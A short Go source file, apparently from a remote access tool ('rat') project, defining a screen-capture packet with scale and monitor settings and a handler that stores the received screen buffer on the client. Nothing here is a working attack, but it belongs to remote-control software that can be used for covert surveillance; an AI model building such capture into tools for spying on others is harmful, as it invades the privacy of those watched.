package main

import (
	"rat/common"
)

type ScreenPacket struct {
	Activate bool    `network:"send"`
	Scale    float32 `network:"send"`
	Monitor  int     `network:"send"`

	Buffer []byte `network:"receive"`
}

func (packet ScreenPacket) Header() common.PacketHeader {
	return common.ScreenHeader
}

func (packet ScreenPacket) Init(c *Client) {

}

func (packet ScreenPacket) OnReceive(c *Client) error {
	c.Screen.Buffer = packet.Buffer

	c.Screen.New = true

	return nil
}
